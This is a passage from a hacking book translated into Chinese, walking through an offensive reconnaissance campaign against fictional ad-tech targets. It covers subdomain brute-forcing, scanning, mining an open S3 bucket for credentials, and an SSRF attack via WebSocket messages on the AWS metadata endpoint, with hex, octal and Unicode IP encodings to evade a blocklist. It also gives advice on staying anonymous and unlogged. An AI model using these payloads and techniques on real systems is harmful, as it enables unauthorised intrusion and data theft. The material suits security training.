[-] Searching now in ThreatCrowd..
[-] Searching now in PassiveDNS..

[-] Total Unique Subdomains Found: 12
dashboard.gretschpolitico.com
```

##### 清单 4-1：使用 sublist3r 枚举域名

我们找到了 12 个子域名，这令人鼓舞。我敢打赌 `mxrads.com` 会有更好的运气。毕竟他们是一家媒体公司。然而，反复使用相同的工具和方法可能会变得无聊。对于 `mxrads.com` 域名，让我们使用不同的工具执行经典的暴力攻击，使用众所周知的子域名关键字，如 `staging.mxrads.com`、`help.mxrads.com`、`dev.mxrads.com` 等。有几款工具可供我们选择来完成这项工作。

`Amass` (`https://github.com/OWASP/Amass/`) from the Open Web Application Security Project (OWASP) is written in Golang and cleverly uses goroutines to parallelize the load of DNS queries. Whereas most other Python tools rely on the system’s DNS resolver to retrieve domains by calling functions like `socket.gethostname`, Amass crafts DNS queries from scratch and sends them to various DNS servers, thus avoiding the bottleneck caused by using the same local resolver. However, Amass is bloated with so many other colorful features, like visualizations and 3D graphs, that it may feel like wielding a 10-pound hammer to scratch an itch on your back. Tempting, but there are lighter alternatives.

我强烈推荐的是一款宣传较少但非常强大的工具 `Fernmelder` (`https://github.com/stealth/fernmelder/`)。它用 C 编写，代码不过几百行，可能是我最近尝试过的最有效率的 DNS 暴力破解工具。`Fernmelder` 接受两个输入：候选 DNS 名称列表和要使用的 DNS 解析器的 IP 地址。这就是我们将使用的方法。



首先，我们使用一些 `awk` 魔法并应用于公共子域名词表来创建可能 DNS 名称的列表，如清单 4-2 所示。例如，Daniel Miessler 的 SecLists 是一个不错的起点：https://github.com/danielmiessler/SecLists/

```
root@Point1:~# awk '{print $1".mxrads.com"}' top-10000.txt > sub_mxrads.txt
root@Point1:~# head sub_mxrads.txt
test.mxrads.com
demo.mxrads.com
video.mxrads.com
--snip--
```

### 清单 4-2：创建潜在的 MXR Ads 子域名列表

这为我们提供了数千个潜在的子域名候选进行尝试。对于第二个输入，您可以借用 Fernmelder 仓库中找到的 DNS 解析器，如清单 4-3 所示。

```
root@Point1:~# git clone https://github.com/stealth/fernmelder
root@Point1:~fern/# make

root@Point1:~fern/# cat sub_mxr.txt | ./fernmelder -4 -N 1.1.1.1 \
-N 8.8.8.8 \
-N 64.6.64.6 \
-N 77.88.8.8 \
-N 74.82.42.42 \
-N 1.0.0.1 \
-N 8.8.4.4 \
-N 9.9.9.10 \
-N 64.6.65.6 \
-N 77.88.8.1 \
-A
```

### 清单 4-3：解析我们的子域名候选以查看哪些是真实的

添加新解析器时要小心，因为某些服务器倾向于耍赖，在解析不存在的域名时返回默认 IP，而不是标准的 NXDOMAIN 回复。命令末尾的 `-A` 选项会隐藏任何不成功的域名解析尝试。

清单 4-3 的结果开始令人印象深刻地快速涌现。我们尝试解析的数千个子域名中，有几十个返回了有效的 IP 地址：

| 子域名 | TTL | 类 | 类型 | Rdata |
|---|---|---|---|---|
| electron.mxrads.net. | 60 | IN | A | 18.189.47.103 |
| cti.mxrads.net. | 60 | IN | A | 18.189.39.101 |
| maestro.mxrads.net. | 42 | IN | A | 35.194.3.51 |
| files.mxrads.net. | 5 | IN | A | 205.251.246.98 |
| staging3.mxrads.net. | 60 | IN | A | 10.12.88.32 |
| git.mxrads.net. | 60 | IN | A | 54.241.52.191 |
| errors.mxrads.net. | 59 | IN | A | 54.241.134.189 |
| jira.mxrads.net. | 43 | IN | A | 54.232.12.89 |
| --snip-- | | | | |

看着这些 IP 地址在屏幕上滚动令人着迷。每个条目都是一扇等待被巧妙设计或强行闯入以授予我们访问权限的门。这就是为什么侦察阶段如此重要：它为我们提供了选择的奢侈，两个组织共有超过 100 个域名！

注意

*查看 Altdns，这是一款有趣的工具，它利用马尔可夫链形成可预测的子域名候选：https://github.com/infosec-au/altdns/*

### 发现使用的 Web 基础设施

检查这些网站的传统方法是对这些新发现的域名运行 WHOIS 查询，从中我们可以确定公司所属的 IP 段。借助它，我们可以使用 `Nmap` 或 `Masscan` 扫描该范围内的开放端口，希望能登陆到未经过身份验证的数据库或保护不佳的 Windows 主机。我们对几个子域名尝试 WHOIS 查询：

```
root@Point1:~# whois 54.232.12.89
NetRange:      54.224.0.0 - 54.239.255.255
CIDR:          54.224.0.0/12
NetName:       AMAZON-2011L
```

然而，仔细查看这个 IP 地址列表后，我们很快意识到它们与 Gretsch Politico 或 MXR Ads 毫无关系。事实证明，我们收集的大多数子域名都运行在 AWS 基础设施上。这是一个重要的结论。AWS 上大多数互联网资源，如负载均衡器、内容分发网络、S3 存储桶等等，都会定期轮换其 IP 地址。

> **NOTE** *内容分发网络（CDN）是一组地理分布的代理，有助于降低终端用户延迟并实现高可用性。它们通常提供本地缓存，将用户指向最近的服务器，通过最快的路径路由数据包，并提供其他服务。Cloudflare、Akamai 和 AWS CloudFront 是其中的关键参与者。*

这意味着，如果我们将这个 IP 列表提供给 `Nmap`，而端口扫描耗时超过几个小时，地址可能已经被分配给另一位客户，结果将不再相关。当然，公司始终可以为服务器附加固定 IP 并直接暴露其应用程序，但这就像故意把一颗铁球直接砸在自己的脚趾上。没有人会那么自虐。

在过去十年里，我们黑客养成了只扫描 IP 地址并跳过 DNS 解析的习惯，以节省几秒钟时间，但当处理云服务提供商时，这可能会致命。相反，我们应该扫描域名；这样，名称解析将在更接近实际扫描时执行，以保证其完整性。

这就是我们接下来要做的。我们对迄今为止收集到的所有域名启动一次快速 `Nmap` 扫描，以查找开放端口：

```
root@Point1:~/# nmap -F -sV -iL domains.txt -oA fast_results
```

我们使用 `-F` 专注于最常见的端口，使用 `-sV` 获取组件的版本，并使用 `-oA` 将结果保存为 XML、RAW 和文本格式。此扫描可能需要几分钟时间，因此在等待其完成的同时，我们将把注意力转向我们发现的属于 MXR Ads 和 Gretsch Politico 的数百个域名和网站的实际内容。

### Resources

- 通过搜索研究人员在星巴克旗下仓库中发现 API 令牌的漏洞报告来查找泄露凭据的示例：https://hackerone.com/reports/716292/
- 如果你不熟悉 Git 的内部原理，请搜索 Juri Strumpflohner 在 https://juristr.com/ 的教程。

## 5

## VULNERABILITY SEEKING

![](img/961e81aef23040d0fbe348f58c055860_79_0.png)

我们有大约 150 个域名需要探索各种漏洞：代码注入、路径遍历、错误的访问控制等等。初涉此类练习的黑客往往会被可能性之多所压倒。從何开始？每个网站应花费多少时间？每个页面呢？如果我们遗漏了什么怎么办？

这可能是最考验你信心的阶段。我将在本书中分享尽可能多的捷径，但请相信我，对于这个特定任务，世界上最古老的配方是最有效的：*练习越多，你就会越好*。你遇到的漏洞越奇妙、越不可思议，你获得的信心就越多，不仅对自己，而且对人类错误的必然性。

### Practice Makes Perfect

那么如何开始呢？完成夺旗赛（CTF）挑战是一种掌握 SQL 注入、跨站脚本（XSS）等漏洞利用基本原理的方法。但请注意，这些练习与易受攻击的应用程序的现实情况相去甚远；它们是由爱好者设计的有趣谜题，而非诚实错误或从 Stack Overflow 帖子中懒惰复制粘贴的结果。

学习漏洞利用的最佳方式是在安全环境中尝试它们。例如，通过在你的实验室中启动 Web 服务器和数据库，编写一个应用程序并对其进行实验来尝试 SQL 注入。发现不同 SQL 解析器的细微差别，编写自己的过滤器以防止注入，尝试绕过这些相同的过滤器，等等。进入开发者的思维，面对解析未知输入以构建数据库查询或在设备和会话之间持久化信息的挑战，你很快就会发现自己犯下了开发者容易犯的同样的危险假设。正如俗话所说，每一个伟大的漏洞背后都潜伏着一个错误的假设在邀功。任何技术栈都可用于实验目的：Apache + PHP、Nginx + Django、NodeJS + Firebase 等等。学习如何使用这些框架，了解它们存储设置和密钥的位置，并确定它们如何编码或过滤用户输入。

随着时间的推移，你会培养出敏锐的眼力，不仅能发现可能存在漏洞的参数，还能发现应用程序如何操纵它们。你的思维方式将从“如何让它工作？”转变为“如何滥用或破坏它？”一旦这个齿轮在你脑后开始转动，你就无法再关掉它——相信我。



我也鼓励你看看别人都在做什么。我很喜欢阅读研究人员在 `Twitter`、`Medium` 以及 `https://pentester.land` 等其他平台上分享的漏洞赏金报告。不仅能让你从工具和方法论中获得启发，而且在某种程度上也会让你放心，即使是最大公司也会在像密码重置表单这样最基本的功能上失败。

值得庆幸的是，就我们的目的而言，我们并不在渗透测试 `engagement` 中，因此时间将是最不令人担忧的问题。事实上，它是我们最宝贵的盟友。我们会根据需要花费尽可能多的时间在每个网站上。你敏锐的洞察力和好奇心就是你需要的全部权限，让你花一整天时间摆弄任何给定的参数。

### Revealing Hidden Domains

回到我们的域名列表。当处理完整的云环境时，有一个捷径可以帮助我们了解更多关于网站的信息并对其进行优先级排序：我们可以揭示公共域名背后的真实域名。云服务提供商通常为客户创建的每个资源生成唯一的 URL，例如服务器、负载均衡器、存储、托管数据库和内容分发端点。以 `Akamai` 为例，它是一个全球内容分发网络（CDN）。对于一台常规服务器，`Akamai` 会创建一个类似 `*e9657.b.akamaiedge.net*` 的域名来优化数据包传输到该服务器。但没有公司会认真使用这个难以发音的域名面向公众；它们会将其隐藏在 `*stellar.mxrads.com*` 或 `*victory.gretschpolitico.com*` 这样华丽的名字后面。浏览器可能认为它正在与 `*victory.gretschpolitico.com*` 通信，但网络数据包实际上被发送到了 `*e9657.b.akamaiedge.net*` 的 IP 地址，然后该地址再将数据包转发到其最终目的地。

如果我们能弄清楚这些隐藏在我们检索到的每个网站后面的云名称，我们可能就能推断出网站所依赖的云服务，从而更专注于更可能出现配置错误的服务：`Akamai` 很不错，但 `AWS S3`（存储服务）和 `API Gateway`（托管代理）更有趣，正如我们很快会看到的那样。或者，如果我们知道某个网站位于 `AWS Application Load Balancer` 后面，例如，我们就可以预料到某些参数过滤，从而调整我们的有效载荷。更有趣的是，我们可以尝试查找“源”或真实服务器 IP 地址，从而完全绕过中间的云服务。

> 查找由 `Akamai`、`Cloudflare`、`CloudFront` 和其他分发网络保护的服务的真实 IP 并非易事。有时 IP 会在错误消息中泄露，有时在 HTTP 头中泄露。其他时候，如果运气好并且服务器具有足够独特的指纹，你可以使用 `Shodan`、`ZoomEye` 或像 `CloudBunny`（`https://github.com/Warflop/CloudBunny/`）这样的自定义工具找到它。

让我们回到我们的域名列表，并将 DNS 侦察再推进一步以找到这些隐藏域名。我们想要查找 `*CNAME 条目*`（指向其他名称记录的名称记录），而不是 IP 地址（正如更常见的 `A 记录` 所做的那样）。命令 `getent hosts` 会提取这些 `CNAME` 记录：

```
root@Point1:~# getent hosts thor.mxrads.com
91.152.253.4    e9657.b.akamaiedge.net stellar.mxrads.com
stellar.mxrads.com.edgekey.net
```

我们可以看到 `*thor.mxrads.com*` 确实位于 `Akamai` 分发点之后。

并非所有替代域名都注册为 `CNAME` 记录；有些是创建为 `ALIAS` 记录，在名称解析过程中不会明确显示。对于这些顽固的情况，我们可以通过在 `AWS` 文档的 `General Reference` 下发布的公共 IP 范围中查找 IP 地址来猜测 `AWS` 服务。

我找不到一个简单的工具来执行这种扩展的 DNS 侦察，因此我编写了一个脚本来自动化该过程：`*DNS Charts*`，可在 `https://dnscharts.hacklikeapornstar.com/` 找到。我们构建一个域名列表，然后将其提供给 `DNS Charts` 以查找这些 `CNAME` 条目，并通过一些额外的正则表达式匹配来猜测云服务。结果以彩色图表打印出来，突出显示域名之间的底层交互，以及公司使用的主要云服务。图 5-1 显示了该工具的一些示例输出。

![](img/961e81aef23040d0fbe348f58c055860_82_0.png)

图 5-1：MXR Ads 使用的服务列表

仅看一眼这张图，就能很清楚地看出首先应该针对哪些最有趣的端点。我们检索到的绝大多数域名都托管在 `AWS` 上，并使用以下服务的混合：`CloudFront`，一个分发网络；`S3`，亚马逊的存储服务；以及 `ELB`，一个负载均衡器。其余的则使用 `Akamai` 分发网络。

注意 `GP`（顶部中央）的仪表板 URL 指向 `MXR Ads`（底部左侧）所属的域名。我们对它们之间密切关系的判断是正确的；这甚至反映在它们各自的基础设施中。

这里我们有几个线索。例如，`gretschpol-alb-1463804911.eu-west-1...` 子域名指的是一个 `AWS Application Load Balancer`（`AWS ALB`），由 URL 中的 `alb` 部分暗示。根据 `AWS` 文档，这是一个第 7 层负载均衡器，负责分发传入流量。理论上，第 7 层负载均衡器能够解析 HTTP 请求，甚至在链接到 `AWS Web Application Firewall`（`AWS WAF`）时阻止某些有效载荷。这是否确实如此尚待推测，当然需要进行主动探测。

> NOTE
> 
> `AWS WAF` 并不是大家期待已久的辉煌 `WAF`。时不时就会冒出一则推文，展示一个简单的绕过方法：`http://bit.ly/303dPm0`。

然而，应用程序负载均衡器可以稍后再说。当我们看到图表时，我们就已经选出了赢家名单。我们将从诱人的 `AWS S3` URL 开始。

### 调查 S3 URL

`AWS S3` 是亚马逊提供的一种高度冗余且廉价的存储服务，起价仅为每 GB `0.023` 美元，外加数据传输。存储在 `S3` 中的对象被组织成存储桶。每个存储桶在所有 `AWS` 账户中都有唯一的名称和 URL（见图 5-2）。

![](img/961e81aef23040d0fbe348f58c055860_83_0.png)

图 5-2：S3 存储桶在 Web 控制台中的显示方式

`S3` 可以托管从 JavaScript 文件到数据库备份的任何内容。随着许多公司（无论大小）迅速采用它，人们在会议上谈到某个随机文件时经常会听到：“哦，就把它放到 `S3` 上吧！”

这种在互联网上集中大量易获取数据的现象吸引着黑客，如同蜜蜂飞向花朵一样，果不其然，无论是小型还是知名公司都曾在耸人听闻的新闻头条中出现。开放且易受攻击的 `S3` 存储桶使这些公司损失了数 TB 的敏感数据，如客户信息、交易历史等等。入侵一家公司从未如此简单。你甚至可以在 `https://buckets.grayhatwarfare.com/` 上找到一个开放 `S3` 存储桶的列表。

我们在图 5-1 中的小 DNS 图显示我们有四个 `S3` URL——`dl.mxrads.com`、`misc.mxrads.com`、`assets.mxrads.com` 和 `resource.mxrads.com`——但实际上可能还有更多未被发现。在检查这些存储桶之前，我们会先将它们筛选出来。有时 `Akamai` 和 `CloudFront` 可以通过 `ALIAS` 记录隐藏 `S3` 存储桶。为了彻底，我们将遍历 18 个 `Akamai` 和 `CloudFront` URL，并仔细查看 HTTP 响应中的 `Server` 指令：

```
root@Point1:~# while read p; do \
echo $p, $(curl --silent -I -i https://$p | grep AmazonS3) \
done <cloudfront_akamai_subdomains.txt

digital-js.mxrads.com, Server: AmazonS3
streaming.mxrads.com, Server: AmazonS3
```

我们又多出了两个存储桶要加入其中。太好了。我们继续加载第一个存储桶 URL `dl.mxrads.com`（`mxrads-files.s3.eu-west-1.amazonaws.com` 的别名），在浏览器中打开，希望能够进入存储桶存储的内容。不幸的是，我们立即被一个相当明确的错误信息挡了回来：

```
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied</Message>
  <RequestId>F9C81BD8E0E5D907</RequestId>
  <HostId>w4yGIMo9hIRXciQKwwab2zoeY0vcDxGkRNIsvWLoR0iyrIsAkdc1f4G1E7v+SGbD1FnEKTt0=
  </HostId>
</Error>
```

访问被拒绝。



与该消息可能暗示的相反，我们实际上并非被禁止访问存储桶中的对象。我们只是不被允许列出存储桶的内容，就像 Apache 服务器中的 `Options -Indexes` 禁用目录列表一样。

> NOTE
> 
> *有时存储桶被删除但 CNAME 仍然定义。在这种情况下，我们可以通过在自己的 AWS 账户中创建同名存储桶来尝试子域名接管。这是一种有趣的技术，在某些情况下可能致命。Patrik Hudak 关于此主题有一篇不错的文章，网址为 `https://0xpatrik.com/takeover-proofs/`。*

### S3 存储桶安全

经历了太多涉及不安全 S3 存储桶的丑闻后，AWS 加强了其默认访问控制。每个存储桶现在都有一个用户可以轻松激活的公共开关，以禁止任何类型的公共访问。这似乎是一个基本功能，但存储桶的访问列表并非由一个、两个、三个，而是由公共开关下方的四个重叠设置来管理！这非常复杂。人们几乎可以原谅公司配置出错。这些设置如下：

- `访问控制列表 (ACLs)` 明确规定哪些 AWS 账户可以访问哪些资源（已弃用）的规则。
- `跨域资源共享 (CORS)` 对来自其他域的 HTTP 请求施加的规则和限制，可以根据请求的 user agent 字符串、HTTP 方法、IP地址、资源名称等进行过滤。
- `存储桶策略` 一个 JavaScript 对象表示法（JSON）文档，其中包含规则，说明允许哪些操作、由谁执行以及在什么条件下执行。存储桶策略取代了 ACL，成为保护存储桶的常规方式。
- `身份和访问管理 (IAM) 策略` 与存储桶策略类似，但这些 JSON 文档附加到用户/组/角色而不是存储桶。

这是一个存储桶策略的示例，允许任何人获取存储桶中的对象，但禁止对存储桶执行任何其他操作，例如列出其内容、写入文件、更改其策略等：

```
{
  "Version":"2012-10-17",
  "Statement":[
    {
      "Sid":"UniqueID", // ID of the policy
      "Effect":"Allow", // Grant access if conditions are met
      "Principal": "*", // Applies to anyone (anonymous or not)
      "Action":["s3:GetObject"], // S3 operation to view a file
"Resource":["arn:aws:s3:::bucketname/*"] // All files in the bucket
}
]
}
```

AWS 将这四个设置的规则结合起来，决定是否接受传入操作。主宰这四个设置的 master switch 称为 `Block public access`（阻止公共访问），当打开时，即使其中一个底层设置明确授权，也会禁用所有公共访问。

复杂吗？这还算是轻描淡写。我鼓励你设置一个 AWS 账户并探索 S3 存储桶的复杂性，以培养识别和利用过于宽松的 S3 设置的正确直觉。

> NOTE
> 
> 还有一个相当难以捉摸的概念，即对象所有权，它凌驾于除公共开关之外的所有其他设置之上。我们稍后会处理它。

### 检查存储桶

回到我们的存储桶列表。我们快速浏览它们，发现除了 `misc.mxrads.com` 之外，其他所有存储桶都被拒绝访问，而 `misc.mxrads.com` 奇怪地返回了一个空页面。缺少错误信息无疑是令人鼓舞的。让我们使用 AWS 命令行进一步探测。首先，我们安装 AWS 命令行界面（CLI）：

```
root@Point1:~/# sudo apt install awscli
root@Point1:~/# aws configure
#### Enter any valid set of credentials to unlock the CLI.
#### You can use your own AWS account, for instance.
```

`AWS CLI` 不接受 S3 URL，因此我们需要找出 `misc.mxrads.com` 背后的真实存储桶名称。大多数情况下，这只需检查域的 CNAME 记录即可，在本例中得到 `mxrads-misc.s3-website.eu-west-1.amazonaws.com`。这告诉我们存储桶的名称是 `mxrads-misc`。如果检查 CNAME 不起作用，我们需要更复杂的技巧，例如在 URL 中注入特殊字符如 `%c0`，或附加无效参数，以尝试让 S3 显示包含存储桶名称的错误页面。

掌握了这个存储桶名称后，我们可以充分利用 AWS CLI 的全部功能。让我们先检索存储桶中存在的对象完整列表并将其保存到文本文件中：

```
root@Point1:~/# aws s3api list-objects-v2 --bucket mxrads-misc > list_objects.txt
root@Point1:~/# head list_objects.txt
{ "Contents": [{
  "Key": "Archive/",
  "LastModified": "2015-04-08T22:01:48.000Z",
  "Size": 0,
```

"Key": "Archive/_old",

"LastModified": "2015-04-08T22:01:48.000Z",

"Size": 2969,

"Key": "index.html",

"LastModified": "2015-04-08T22:01:49.000Z",

"Size": 0,

},

--snip--

```

我们得到大量对象——多到无法手动检查。为了准确找出数量，我们对 `"Key"` 参数进行 `grep`：

```
root@Point1:~# grep '"Key"' list_objects.txt | wc -l

425927
```

Bingo！我们在这个单一存储桶中存储了超过 40 万个文件。这已经是相当不错的发现了。在对象列表中，注意到 S3 存储桶根目录下空的 `index.html`；S3 存储桶可以被设置为充当托管静态文件（如 JavaScript 代码、图像和 HTML）的网站，而这个 `index.html` 文件正是我们在之前运行 URL 时得到空白页面的原因。

### S3 文件系统

也要注意到 S3 的内部目录系统缺乏任何层次结构。认为 S3 是一个文件系统的想法是一个常见的误解。它不是。没有文件夹，也没有文件——至少不是在它们常见的现代定义中。S3 是一个键值存储系统。句号。AWS 的 Web 控制台给人一种在文件夹内组织文件的错觉，但那只是一些 GUI 障眼法。S3 中的文件夹只是一个指向空值的键。看起来在文件夹内部的文件不过是由形如 `/folder/file` 的键引用的存储 blob。换句话说，使用 AWS CLI，我们可以删除一个文件夹而不删除该文件夹的文件，因为两者绝对没有关联。

是时候进行一些穷人的数据挖掘了。让我们使用正则表达式模式查找 SQL 脚本、bash 文件、备份归档、JavaScript 文件、配置文件、VirtualBox 快照——任何可能提供有价值凭据的东西：

```
#### We extract the filenames in the "Key" parameters:

root@Point1:~# grep '"Key"' list_objects | sed 's/[" ,]/ /g' > list_keys.txt

root@Point1:~# patterns='\.sh$|\.sql$|\.tar\.gz$|\.properties$|\.config$|\.tgz$'

root@Point1:~# egrep $patterns list_keys.txt

Key: debug/360-ios-safari/deploy.sh
```

```
Key: debug/ias-vpaidjs-ios/deploy.sh
Key: debug/vpaid-admetrics/deploy.sh
Key: latam/demo/SiempreMujer/nbpro/private/private.properties
Key: latam/demo/SiempreMujer/nbpro/project.properties
Key: demo/idesign-immersion/deploy-cdn.sh
Key: demo/idesign-immersion/deploy.sh
Key: demo/idesign-mobile-360/deploy.sh
--snip--
```



这给了我们一份具有一定潜力的文件列表。然后我们使用 `aws s3api get-object` 下载这些候选文件，并逐一仔细检查，希望能找到某种有效的凭据。需要记住一个有趣的事实是，AWS 默认不会记录 S3 对象操作，如 `get-object` 和 `put-object`，因此我们可以尽情下载文件，而知道没有人追踪我们的行动。遗憾的是，其他 AWS API 就不能这么说了。

数小时的研究后我们仍然一无所获，什么都没有。看起来大多数脚本都是旧的三行脚本，用于下载公共文档、获取其他脚本、自动化常规命令或创建虚拟 SQL 表。

试试别的办法。也许存在一些敏感数据文件逃过了我们之前的模式过滤。也许堆里藏着扩展名不常见的隐藏文件。为了找到这些文件，我们运行了一个激进的反向搜索，剔除图像、层叠样式表（CSS）和字体等常见且无用的文件，以期揭示一些隐藏的宝藏：

```
root@Point1:~/# egrep -v "\.jpg\|\.png\|\.js\|\.woff\|\",$\|.css\|.gif\|.svg\|.ttf\|.eot" list_keys.txt
```

```
Key: demo/forbes/ios/7817/index.html

Key: demo/forbes/ios/7817/index_1.html

Key: demo/forbes/ios/7817/index_10.html

Key: demo/forbes/ios/7817/index_11.html

Key: demo/forbes/ios/7817/index_12.html

Key: demo/forbes/ios/7817/index_13.html

--snip--
```

```
root@Point1:~/# aws s3api get-object --bucket mxrads-misc \
--key demo/forbes/ios/7817/index.html forbes_index.html
```

HTML 文件并不是我们心目中特别的文件，但由于它们占了这个存储桶中超过 75% 的文件，我们最好还是看看。打开它们后，我们发现它们似乎是来自世界各地新闻网站的保存页面。在这个混乱的 GP 基础设施的某个地方，一个应用程序正在抓取网页并将它们存储在这个存储桶中。我们想知道为什么。

还记得在引言中我提到过那种特别的黑客 flair 吗？这就是它。这是一种应该让你脊椎发凉的发现！

### 检查面向 Web 的应用程序

这个该死的应用程序藏在哪里？为了把它找出来，我们回到图 5-1 中的 DNS 侦察结果，果然，完美的嫌疑人从中跳了出来：`demo.mxrads.com`。我们在带有 HTML 文件的 S3 键中看到了相同的“demo”关键词。我们甚至都不用 `grep`。

我们在浏览器中输入 `demo.mxrads.com`，可以看到主图像和标题似乎描述了我们正在寻找的行为（见图 5-3）。

![](img/961e81aef23040d0fbe348f58c055860_88_0.png)

图 5-3：`demo.mxrads.com` 的主页

为了更仔细地查看此页面，我们将启动 Burp Suite，这是一个本地 Web 代理，可以方便地拦截并中继来自浏览器的每个 HTTP 请求（OWASP 粉丝可以使用 ZAP，即 Zed Attack Proxy）。我们在 Burp 运行的情况下重新加载 `demo.mxrads.com`，可以看到站点发出的请求实时 trickling 下来，如图 5-4 所示。

![](img/961e81aef23040d0fbe348f58c055860_88_1.png)

图 5-4：Burp 对 MXR Ads 演示页面的检查

注 为了增加匿名性，我们可以指示 Burp 或 ZAP 将其流量通过攻击服务器上的 SOCKS 代理，以便确保所有数据包都源自该远程主机。在 Burp 中在 Options 下查找 SOCKS 代理。

这是一个很好的攻击面。使用 Burp，我们可以拦截这些 HTTP(S) 请求，即时修改它们，随意重复它们，甚至配置正则表达式规则以自动匹配和替换标头。如果你曾经做过 Web 渗透测试或 CTF 挑战，你一定使用过类似的工具。但我们现在先把它放在一边，继续我们的调查。

我们回到检查 `demo.mxrads.com` 站点。正如我们从 MXR Ads 这样的公司所预期的那样，该网站提供在多个浏览器和设备上展示演示广告的功能，也在一些特色网站上展示，例如

`nytimes.com` 和 `theregister.com`（见图 5-5）。世界各地的销售团队很可能利用这些功能来说服媒体合作伙伴，他们的技术可以无缝集成到任何 Web 框架中。相当聪明。

![](img/961e81aef23040d0fbe348f58c055860_89_0.png)

图 5-5：MXR Ads 在各种热门网站上展示广告的功能

我们将通过尝试该功能来检查页面。我们选择在《纽约时报》网站上展示广告，一个新的内容窗口弹出，中间叠放着一个随机香水品牌的漂亮广告，放在今天 NYT 主页的中间。

这个演示页面看起来像是一个无害的功能：我们指向一个网站，应用程序获取其实际内容并添加一个视频播放器和随机广告，以向潜在客户展示 MXR Ads 的功能。它可能引入什么漏洞？太多了……

在我们查看如何利用此应用程序之前，让我们先使用 Burp Proxy 评估幕后发生了什么。当我们点击 NYT 选项来展示广告时会发生什么？我们看到的结果如图 5-6 所示。

![](img/961e81aef23040d0fbe348f58c055860_89_1.png)

图 5-6：点击 `demo.mxrads.com` 上的 NYT 选项后 HTTP History 选项卡

我们没有多少 HTTP 流量，这很确定。一旦网页加载完成，服务器会响应一条“HTTP/1.1 101 Switching Protocols”消息，然后在 HTTP History 选项卡中不再出现通信。我们需要切换到 WebSockets History 选项卡以跟随其余的交换。

### 使用 WebSocket 进行拦截

WebSocket 是与 HTTP 并列的另一种通信协议，但与 HTTP 不同，WebSocket 是一个全双工通信通道。在常规 HTTP 协议中，每个服务器响应都对应一个客户端请求。服务器不会在两次请求之间维护状态；相反，状态

由 Cookie 和头部信息处理，它们帮助后端应用程序记住是谁在调用哪个资源。WebSocket 的运作方式不同：客户端和服务器建立一个全双工且绑定的隧道，双方都可以随时发起通信。出现一个出站消息对应多个入站消息，或反之的情况并不罕见。有关 WebSocket 的更多信息，请查看 `https://blog.teamtreehouse.com/an-introduction-to-websockets/`。WebSocket 的美妙之处在于它们不需要 HTTP Cookie，因此也不费心去支持它们。这些正是维护用户身份验证会话的 Cookie！因此，只要在经过身份验证的会话中从 HTTP 切换到 WebSocket，就有机会通过直接使用 WebSocket 而非 HTTP 获取敏感资源来绕过访问控制——但那是另一类漏洞，留待以后再说。图 5-7 显示了我们的 WebSockets 历史记录标签页。

![](img/961e81aef23040d0fbe348f58c055860_90_0.png)

Figure 5-7: `demo.mxrads.com` 的 WebSockets 历史记录标签页

WebSocket 通信看起来相当直接：发送到服务器的每条消息都由一个 URL（`nytimes.com`）组成，其后是与用户浏览器相关的指标（`Mozilla/5.0 . .`），以及要显示的广告标识符（`437`）。Burp 无法重放（在 Burp 术语中为 `repeat`）过去的 WebSocket 通信，因此要篡改 WebSocket 消息，我们需要从演示网站手动触发它。

我们在 Burp 选项中打开拦截模式，这将允许我们捕获下一条交换的消息并即时更新它（见图 5-8）。例如，让我们看看是否能让 MXR Ads 网站获取我们在第 3 章中设置的 Nginx 容器的主页。

![](img/961e81aef23040d0fbe348f58c055860_90_1.png)

Figure 5-8: 在 Burp 中拦截网页

我们转发修改后的请求并前往 Docker 容器探索日志。我们使用 `docker ps` 获取容器 ID，然后将其提供给 `docker logs`：

```
root@Nginx:~/# docker ps

CONTAINER ID   IMAGE          COMMAND

5923186ffda5   sparcflow/ngi...  "/bin/bash /sc..."
```

```
root@Nginx:~/# docker logs 5923186ffda5

54.221.12.35 - - [26/Oct/2020:13:44:08 +0000] "GET / HTTP/1.1"...
```



MXR Ads 应用确实会实时获取 URL！你问这有什么厉害的？嗯，并非所有域名和 IP 地址都一样，你看。某些 IP 地址具有特定的用途。一个完美的例子是 `127.0.0.0/8` 块，它指的是回环地址（主机本身），或 `192.168.0.0/16`，它保留用于私有网络。一个鲜为人知的 IP 地址范围是 `169.254.0.0/16`，它由互联网工程任务组（IETF）保留用于链路本地寻址，这意味着该范围仅适用于网络内部通信，无法路由到互联网。例如，当计算机无法通过 DHCP 获取 IP 地址时，它会为自己分配该范围内的 IP。更重要的是，许多云服务提供商也使用该范围向其虚拟机公开私有 API，以便它们了解自己的环境。

在几乎所有云服务提供商上，对 IP `169.254.169.254` 的调用都会路由到 hypervisor 并检索有关主机名、内部 IP、防火墙规则等内部事务的信息。这是一座元数据的宝库，可能让我们窥探公司内部架构的一角。

我们试试看，好吗？在 Burp 拦截模式仍开启的情况下，我们触发另一条 WebSocket 消息以在《纽约时报》上展示广告，但这次我们用默认的 AWS 元数据 URL `http://169.254.169.254/latest` 替换消息正文中的 URL，如下所示：

#### Modified WebSocket message:

```
http://169.254.169.254 ! Mozilla/5.0 (Windows NT 9.0; Win64; x64...
```

我们等待服务器的响应——记住它是异步的——但什么也没有返回。

MXR Ads 并没有让我们轻松。合理地假设 URL 正是因为这个原因在应用中被明确禁止。或者也许应用只是期望一个有效的域名？让我们用一个更无害的 IP（例如我们的 Nginx 容器）替换元数据 IP：

#### Modified WebSocket message:

```
http://54.14.153.41/:! Mozilla/5.0 (Windows NT 9.0; Win64; x64...
```

我们检查日志，果然看到了来自应用的请求：

```
root@Point1:~/# docker logs 5923186ffda5

54.221.12.35 - - [26/Oct/2020:13:53:12 +0000] "GET / HTTP/1.1"...
```

好吧，所以某些 IP 地址是允许的，但 `169.254.169.254` 必须被应用明确禁止。是时候拿出我们那套肮脏的字符串解析技巧了。尽管 IP 地址通常以十进制格式表示，但浏览器和网络客户端实际上也接受更晦涩的表示形式，如十六进制或八进制。例如，以下所有 IP 地址都是等价的：

```
http://169.254.169.254

http://0xa9fea9fe # hexadecimal representation

http://0xA9.0xFE.0xA9.0xFE # dotted hexadecimal

http://025177524776 # octal representation

http://①⑥⑨.②⑤④.①⑥⑨.②⑤④ # Unicode representation
```

我们可以通过尝试其十六进制、点分十六进制和八进制的替代形式来绕过 IP 地址禁令。

### 将私有 IP 地址分配给公共域名

一种替代技术是注册一个解析为 `169.254.169.254` 的自定义域名，然后使用该域名尝试绕过硬编码检查。毕竟，没有什么禁止我们将私有 IP 地址分配给公共域名。IP 地址会被第一个公共路由器丢弃，但由于请求不会离开物理网卡，这个技巧效果极佳。

在这种情况下，简单的十六进制格式就足够了，我们得到了 AWS 元数据 API 的著名输出，如图 5-9 所示。

